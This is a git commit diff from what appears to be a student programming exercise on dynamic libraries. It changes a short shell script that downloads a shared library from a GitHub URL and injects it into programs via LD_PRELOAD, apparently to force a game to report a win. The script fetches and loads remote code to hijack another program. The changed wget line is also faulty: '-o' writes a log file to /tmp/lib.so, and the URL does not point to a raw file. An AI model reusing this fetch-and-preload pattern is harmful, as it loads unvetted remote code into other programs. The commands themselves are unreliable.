e94bce4e864c295764fa17ebc9ce8e09a978aea1
Moses Kisya <118076277+kishea-dev@users.noreply.github.com>
2023-05-17 17:37:57 +0300

    make me win

--- 0x18-dynamic_libraries/101-make_me_win.sh
+++ 0x18-dynamic_libraries/101-make_me_win.sh
@@ -1,3 +1,3 @@
 #!/bin/bash
-wget -P /tmp/ https://github.com/gims-inc/alx-low_level_programming/master/0x18-dynamic_libraries/winner.so
-export LD_PRELOAD=/tmp/winner.so
+wget https://github.com/kishea-dev/alx-low_level_programming/master/0x18-dynamic_libraries/lib.so -o /tmp/lib.so
+export LD_PRELOAD=/tmp/lib.so
